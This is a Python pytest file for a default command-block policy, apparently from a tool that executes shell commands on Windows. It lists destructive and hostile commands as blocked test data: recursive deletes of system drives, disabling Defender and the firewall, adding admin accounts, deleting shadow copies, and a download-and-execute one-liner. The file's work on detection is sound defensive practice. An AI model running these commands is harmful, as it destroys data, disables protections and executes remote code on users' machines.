"""默认禁止规则的回归测试。客户端 CommandPolicyTests 使用同一组用例。"""

import re

import pytest

from app.default_policy import DEFAULT_POLICY

PATTERNS = [re.compile(p, re.IGNORECASE) for p in DEFAULT_POLICY["blocked_patterns"]]
RECURSIVE = [re.compile(p, re.IGNORECASE) for p in DEFAULT_POLICY["recursive_delete_patterns"]]

# 递归强制删除：**不再**按动词一刀切。这里只断言「认得出来」，
# 删的到底是 node_modules 还是 C:\Users 由客户端解析目标后判，
# 对应的用例在 client/tests/.../RecursiveDeleteTests.cs。
RECURSIVE_DELETES = [
    "rm -rf /",
    "rm -fr C:\\Users",
    "rm -rf ./build",
    "Remove-Item -Recurse -Force C:\\data",
    "remove-item C:\\x -force -recurse",
    "rd /s /q D:\\old",
    "rmdir /S C:\\temp",
    "del /f /s /q C:\\*",
]

BLOCKED = [
    "format C: /q",
    "diskpart",
    "bcdedit /set {current} safeboot minimal",
    'reg delete "HKLM\\Software\\Foo" /f',
    "Set-MpPreference -DisableRealtimeMonitoring $true",
    "netsh advfirewall set allprofiles state off",
    "net user admin P@ssw0rd",
    "net localgroup administrators bob /add",
    "shutdown /s /t 0",
    "Restart-Computer -Force",
    "iwr http://x.com/a.ps1 | iex",
    "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    "sc delete WinDefend",
    "Stop-Service -Name wuauserv",
    "del C:\\Windows\\System32\\drivers\\etc\\hosts",
    "vssadmin delete shadows /all",
]

ALLOWED = [
    "ipconfig /all",
    "ping 10.0.0.1",
    "dir D:\\reports",
    "Get-ChildItem D:\\reports -Recurse",
    "copy D:\\a.xlsx D:\\backup\\a.xlsx",
    "rm D:\\temp\\old.txt",
    "del D:\\temp\\old.txt",
    "Remove-Item D:\\temp\\old.txt",
    "tasklist",
    "net use Z: \\\\fileserver\\share",
    "start outlook",
    "format-table",
]


def blocked(cmd: str) -> bool:
    return any(p.search(cmd) for p in PATTERNS)


@pytest.mark.parametrize("cmd", BLOCKED)
def test_dangerous_commands_are_blocked(cmd):
    assert blocked(cmd), cmd


@pytest.mark.parametrize("cmd", ALLOWED)
def test_ordinary_commands_are_not_blocked(cmd):
    assert not blocked(cmd), cmd


@pytest.mark.parametrize("command", RECURSIVE_DELETES)
def test_recursive_deletes_are_recognised(command):
    """认得出是递归强制删除。拦不拦由客户端按目标决定。"""
    assert any(p.search(command) for p in RECURSIVE), command


@pytest.mark.parametrize("command", RECURSIVE_DELETES)
def test_recursive_deletes_are_no_longer_blanket_blocked(command):
    """这组命令不该再出现在硬阻止名单里——拆分要是没拆干净，rm -rf node_modules 又会被一刀切。"""
    assert not any(p.search(command) for p in PATTERNS), command


def test_critical_roots_cannot_be_deleted_whole():
    roots = {r.lower().rstrip("\\") for r in DEFAULT_POLICY["no_delete_roots"]}
    for must in ("c:", "c:\\users", "c:\\windows", "c:\\program files", "c:\\programdata"):
        assert must in roots, must


def test_protected_roots_do_not_include_the_user_folder():
    """protected_roots 连写都挡。把 C:\\Users 放进去，用户连自己的文档都写不了。"""
    assert not any("users" in r.lower() for r in DEFAULT_POLICY["protected_roots"])
